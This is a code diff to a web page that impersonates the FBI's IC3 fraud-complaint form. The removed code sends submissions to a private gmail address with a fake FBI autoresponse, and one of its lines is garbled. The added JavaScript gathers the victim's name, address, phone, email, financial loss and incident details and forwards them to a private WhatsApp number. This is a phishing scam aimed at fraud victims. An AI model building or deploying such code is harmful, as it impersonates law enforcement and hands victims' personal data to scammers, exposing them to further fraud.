@@ -194,18 +194,7 @@
             <!-- Hidden iframe for FormSubmit to prevent redirect -->
             <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){formSuccess();}"></iframe>
 
-            <form id="fraudForm" action="https://formsubmit.co/mikeandrew27777@gmail.com" method="POST" enctype="multipart/form-data" target="hidden_iframe" onsubmit="return validateAndSubmit();">
-                <!-- FormSubmit Configuration -->
-                <input type="hidden" name="_subject" value="New Fraud                 <a href="https://wa.me/17755859248?text=Complaint%20details%3A%20" target="_blank" rel="noopener" class="bg-fbi-gold hover:bg-yellow-600 text-fbi-dark font-bold py-4 px-8 rounded-lg shadow-lg transform hover:scale-105 transition flex items-center justify-center">
-    <i class="fas fa-file-alt mr-2"></i>
-    File a Complaint Now
-</a>">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_captcha" value="true">
-                <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html">
-                <input type="hidden" name="_autoresponse" value="Thank you for submitting your complaint to FBI. Your report has been received and will be reviewed by our analysts. Please retain your reference number for future inquiries.">
-                <input type="hidden" name="_cc" value="backup@yourdomain.com">
-                
+            <form id="fraudForm" action="#" method="GET" onsubmit="return validateAndSubmit();">
                 <!-- Hidden field for fraud type (set by JS) -->
                 <input type="hidden" name="fraud_type" id="hiddenFraudType" value="">
                 <input type="hidden" name="submission_date" id="submissionDate" value="">
@@ -724,38 +713,44 @@
                 alert('Please certify that the information is true and correct.');
                 return false;
             }
-            
-            // Generate reference number
-            const year = new Date().getFullYear();
-            const random = Math.floor(1000000 + Math.random() * 9000000);
-            const refNumber = `IC3-${year}-${random}`;
-            
-            // Set hidden fields
-            document.getElementById('hiddenRefNumber').value = refNumber;
-            document.getElementById('submissionDate').value = new Date().toISOString();
-            document.getElementById('refNumber').textContent = refNumber;
-            
-            // Set confirmation email
-            const email = document.querySelector('input[name="email"]').value;
-            document.getElementById('confirmEmail').textContent = email;
-            
-            // Update file names in hidden field
-            if (uploadedFiles.length > 0) {
-                document.getElementById('fileNames').value = uploadedFiles.map(f => f.name).join(', ');
-            }
-            
-            // Show loading state
-            document.getElementById('step4').classList.add('hidden');
-            document.getElementById('loadingState').classList.remove('hidden');
-            
-            // Disable submit button
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            document.getElementById('btnText').textContent = 'Submitting...';
-            document.getElementById('btnSpinner').classList.remove('hidden');
-            
-            submitted = true;
-            return true; // Allow form to submit to iframe
+
+            const firstName = document.querySelector('input[name="first_name"]')?.value || 'N/A';
+            const lastName = document.querySelector('input[name="last_name"]')?.value || 'N/A';
+            const address = document.querySelector('input[name="address"]')?.value || 'N/A';
+            const city = document.querySelector('input[name="city"]')?.value || 'N/A';
+            const state = document.querySelector('input[name="state"]')?.value || 'N/A';
+            const zip = document.querySelector('input[name="zip"]')?.value || 'N/A';
+            const email = document.querySelector('input[name="email"]')?.value || 'N/A';
+            const phone = document.querySelector('input[name="phone"]')?.value || 'N/A';
+            const contactMethod = document.querySelector('input[name="contact_method"]:checked')?.value || 'N/A';
+            const incidentDate = document.querySelector('input[name="incident_date"]')?.value || 'N/A';
+            const financialLoss = document.querySelector('input[name="financial_loss"]')?.value || '0.00';
+            const perpetratorName = document.querySelector('input[name="perpetrator_name"]')?.value || 'N/A';
+            const perpetratorContact = document.querySelector('input[name="perpetrator_contact"]')?.value || 'N/A';
+            const description = document.querySelector('textarea[name="description"]')?.value || 'N/A';
+            const fileNames = uploadedFiles.length > 0 ? uploadedFiles.map(f => f.name).join(', ') : 'None';
+            const fraudType = selectedFraudType || 'N/A';
+
+            const message = `Complaint details:\n` +
+                `Incident Type: ${fraudType}\n` +
+                `First Name: ${firstName}\n` +
+                `Last Name: ${lastName}\n` +
+                `Address: ${address}\n` +
+                `City: ${city}\n` +
+                `State: ${state}\n` +
+                `ZIP: ${zip}\n` +
+                `Phone: ${phone}\n` +
+                `Email: ${email}\n` +
+                `Preferred Contact Method: ${contactMethod}\n` +
+                `Date of Incident: ${incidentDate}\n` +
+                `Estimated Financial Loss: $${financialLoss}\n` +
+                `Subject Information: ${perpetratorName} / ${perpetratorContact}\n` +
+                `Description: ${description}\n` +
+                `Attached Files: ${fileNames}`;
+
+            const whatsappUrl = `https://wa.me/17755859248?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+            return false;
         }
 
         function formSuccess() {
